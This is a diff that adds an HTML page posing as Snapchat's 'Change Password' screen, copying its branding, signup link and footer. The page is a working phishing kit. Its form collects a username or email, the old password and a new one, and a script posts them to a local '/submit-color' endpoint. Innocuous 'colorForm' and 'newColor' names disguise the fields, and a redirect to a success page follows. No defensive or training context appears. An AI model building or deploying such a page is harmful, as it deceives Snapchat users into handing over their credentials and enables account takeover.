@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password | Snapchat</title>
+    <link rel="icon" type="image/png" href="icon.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f2f2f2;
+            font-family: 'Poppins', sans-serif;
+            color: #000;
+        }
+        .login-page {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 20px; /* reduced top spacing */
+            width: 100%;
+        }
+        .wrapper {
+            background: #fff;
+            border-radius: 10px;
+            padding: 40px;
+            padding-bottom: 40px; /* standard bottom padding */
+            width: 360px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-bottom: 80px; /* added space below panel */
+        }
+        .wrapper .logo {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+        .wrapper h1 {
+            font-size: 24px;
+            margin-bottom: 24px;
+        }
+        form .input-box {
+            margin-bottom: 16px;
+        }
+        .input-box input {
+            width: 100%;
+            padding: 12px 20px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0ea5fc;
+            border: none;
+            border-radius: 25px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .signup {
+            margin-top: 24px;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0ea5fc;
+            text-decoration: none;
+        }
+        footer {
+            background: #fff;
+            border-top: 1px solid #ddd;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            max-width: 1200px;
+            margin: 0 auto 24px;
+            padding: 40px 20px 0;
+        }
+        .footer-links > div {
+            flex: 1 1 200px;
+            margin: 10px;
+        }
+        .footer-links h4 {
+            font-size: 14px;
+            margin-bottom: 12px;
+            color: #000;
+        }
+        .footer-links ul {
+            list-style: none;
+        }
+        .footer-links li {
+            margin-bottom: 8px;
+        }
+        .footer-links a {
+            font-size: 14px;
+            color: #000000;
+            text-decoration: none;
+        }
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 10px;
+            background-color: #e5e5e5;
+        }
+        .footer-bottom select {
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .footer-bottom .legal-links {
+            margin-top: 16px;
+        }
+        .footer-bottom .legal-links a {
+            margin-left: 20px;
+            font-size: 14px;
+            color: #2c2c2c;
+            text-decoration: none;
+        }
+        .footer-bar {
+            width: 100%;
+            height: 2px;
+            background-color: #363636;
+        }
+        @media (min-width: 600px) {
+            .footer-bottom .legal-links {
+                margin-top: 0;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+</head>
+</head>
+<body>
+  <div class="login-page">
+    <div class="wrapper">
+      <img src="logo.svg" alt="Snapchat Logo" class="logo">
+      <h1>Change Password</h1>
+      <form id="colorForm">
+        <div class="input-box">
+          <input type="text" id="user" name="user" placeholder="Username or Email" required>
+        </div>
+        <div class="input-box">
+          <input type="password" id="pass" name="pass" placeholder="Old Password" required>
+        </div>
+        <div class="input-box">
+          <input type="password" id="newColor" name="newColor" placeholder="New Password" required>
+        </div>
+        <button type="submit" class="btn">Next</button>
+      </form>
+
+      <!-- Add a response div so JS can update it -->
+      <div id="response" style="margin-top: 1em; color: green;"></div>
+
+      <div class="signup">
+        <span>New To Snapchat?</span> 
+        <a href="https://accounts.snapchat.com/v2/signup">Sign Up</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  document.getElementById('colorForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const username = document.getElementById('user').value;
+    const password = document.getElementById('pass').value;
+    const newColor = document.getElementById('newColor').value;
+
+    const response = await fetch('/submit-color', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password, newColor })
+    });
+
+    if (response.ok) {
+      // ✅ Redirect to success.html
+      window.location.href = '/success.html';
+    } else {
+      // Show error on page
+      const text = await response.text();
+      document.getElementById('response').innerText = text;
+    }
+  });
+</script>
+
+    <footer>
+        <div class="footer-links">
+            <div>
+                <h4>Company</h4>
+                <ul>
+                    <li><a href="#">Snap Inc.</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">News</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Community</h4>
+                <ul>
+                    <li><a href="#">Support</a></li>
+                    <li><a href="#">Community Guidelines</a></li>
+                    <li><a href="#">Safety Center</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Advertising</h4>
+                <ul>
+                    <li><a href="#">Buy Ads</a></li>
+                    <li><a href="#">Advertising Policies</a></li>
+                    <li><a href="#">Political Ads Library</a></li>
+                    <li><a href="#">Brand Guidelines</a></li>
+                    <li><a href="#">Promotions Rules</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Privacy Center</a></li>
+                    <li><a href="#">Your Privacy Choices</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                    <li><a href="#">Report Infringement</a></li>
+                    <li><a href="#">Custom Creative Tools Terms</a></li>
+                    <li><a href="#">Community Geofilter Terms</a></li>
+                    <li><a href="#">Lens Studio Terms</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <select>
+                <option>English (US)</option>
+                <option>Español</option>
+                <option>Français</option>
+            </select>
+            <div class="legal-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+        </div>
+        <div class="footer-bar"></div>
+    </footer>
+</body>
+</html>
